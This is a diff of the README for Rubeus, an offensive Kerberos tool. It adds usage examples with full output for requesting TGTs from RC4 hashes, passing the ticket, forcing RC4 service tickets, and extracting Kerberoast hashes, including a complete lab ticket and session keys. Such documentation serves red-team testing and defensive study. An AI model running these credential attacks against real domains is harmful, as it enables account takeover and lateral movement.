@@ -253,23 +253,56 @@ Requesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the
     | |  \ \| |_| | |_) ) ____| |_| |___ |
     |_|   |_|____/|____/|_____)____/(___/
 
-    v1.3.3
+    v1.4.1
 
     [*] Action: Ask TGT
 
     [*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
     [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
     [*] Building AS-REQ (w/ preauth) for: 'testlab.local\dfm.a'
-    [*] Connecting to 192.168.52.100:88
-    [*] Sent 230 bytes
-    [*] Received 1537 bytes
     [+] TGT request successful!
     [*] base64(ticket.kirbi):
 
-        doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...
+        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
 
     [*] Action: Import Ticket
     [+] Ticket successfully imported!
+
+    [*] Action: Describe Ticket
+
+    UserName              :  dfm.a
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  krbtgt/testlab.local
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  2/25/2019 3:06:07 PM
+    EndTime               :  2/25/2019 8:06:07 PM
+    RenewTill             :  3/4/2019 3:06:07 PM
+    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType               :  rc4_hmac
+    Base64(key)           :  +zY8adXi2NuvkAxl1ohUOA==
 
 
 Requesting a ticket via aes256_hmac hash for **dfm.a@testlab.local**, starting a new hidden process and applying the ticket to that logon session. **Note: elevation needed!**
@@ -317,6 +350,10 @@ Requesting a ticket via aes256_hmac hash for **dfm.a@testlab.local**, starting a
 ### asktgs
 
 The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket request using the specified TGT `/ticket:X` supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the request traffic. The `/ptt` flag will "pass-the-ticket" and apply the resulting service ticket to the current logon session. One or more `/service:X` SPNs **must** be specified, comma separated.
+
+The supported encryption types in the constructed TGS-REQ will be RC4_HMAC, AES128_CTS_HMAC_SHA1, and AES256_CTS_HMAC_SHA1. In this case, the highest mutually supported encryption will be used by the KDC to build the returned service ticket. If you want to force DES, RC4, or AES128/256 keys, use `/enctype:[RC4|AES128|AES256|DES]`.
+
+Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the "LDAP/primary.testlab.local" and "cifs/primary.testlab.local" SPNs:
 
     C:\Rubeus>Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe
 
@@ -396,7 +433,6 @@ The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket requ
     v1.3.3
 
 
-
     [*] Action: List Kerberos Tickets (Current User)
 
         [0] - 0x12 - aes256_cts_hmac_sha1
@@ -410,6 +446,43 @@ The **asktgs** action will build/parse a raw TGS-REQ/TGS-REP service ticket requ
         Server Name       : LDAP/primary.testlab.local @ TESTLAB.LOCAL
         Client Name       : dfm.a @ TESTLAB.LOCAL
         Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+
+Requesting a service ticket for an AES-enabled service account, specifying that we _only_ support RC4_HMAC:
+
+    C:\Rubeus>Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip).../service:roast/me /enctype:rc4
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.1
+
+    [*] Action: Ask TGS
+
+    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+    [*] Requesting 'rc4_hmac' etype for the service ticket
+    [*] Building TGS-REQ request for: 'roast/me'
+    [+] TGS request successful!
+    [*] base64(ticket.kirbi):
+
+        doIFrjCCBaqgAwIBBaEDA...(snip)...
+
+    [*] Action: Describe Ticket
+
+    UserName              :  dfm.a
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  roast/me
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  2/25/2019 3:10:59 PM
+    EndTime               :  2/25/2019 8:09:54 PM
+    RenewTill             :  3/4/2019 3:09:54 PM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
+    KeyType               :  rc4_hmac
+    Base64(key)           :  Gg3zZicIl5c50KGecCf8XA==
 
 
 ### renew
@@ -943,6 +1016,10 @@ The **purge** action will purge all Kerberos tickets from the current logon sess
 
 The **describe** action takes a `/ticket:X` value (TGT or service ticket), parses it, and describes the values of the ticket. Like other `/ticket:X` parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.
 
+If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.
+
+Display information about a TGT:
+
     C:\Rubeus>Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
 
      ______        _
@@ -967,6 +1044,34 @@ The **describe** action takes a `/ticket:X` value (TGT or service ticket), parse
     Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
     KeyType               :  rc4_hmac
     Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==
+
+Display information about service ticket with an extracted Kerberoast hash:
+
+    C:\Rubeus>Rubeus.exe describe /ticket:service_ticket.kirbi
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.1
+
+
+    [*] Action: Describe Ticket
+
+    UserName              :  harmj0y
+    UserRealm             :  TESTLAB.LOCAL
+    ServiceName           :  asdf/asdfasdf
+    ServiceRealm          :  TESTLAB.LOCAL
+    StartTime             :  2/20/2019 8:58:14 AM
+    EndTime               :  2/20/2019 12:41:09 PM
+    RenewTill             :  2/27/2019 7:41:09 AM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType               :  rc4_hmac
+    Base64(key)           :  WqGWK4htp7rM1CURpxjMPA==
+    Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E...(snip)...
 
 
 ## Ticket Extraction and Harvesting
@@ -1990,6 +2095,7 @@ Breakdown of the miscellaneous commands:
 | ----------- | ----------- |
 | [createnetonly](#createnetonly) | Create a process of logon type 9 |
 | [changepw](#changepw) | Perform the Aorato Kerberos password reset |
+| [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |
 
 
 ### createnetonly
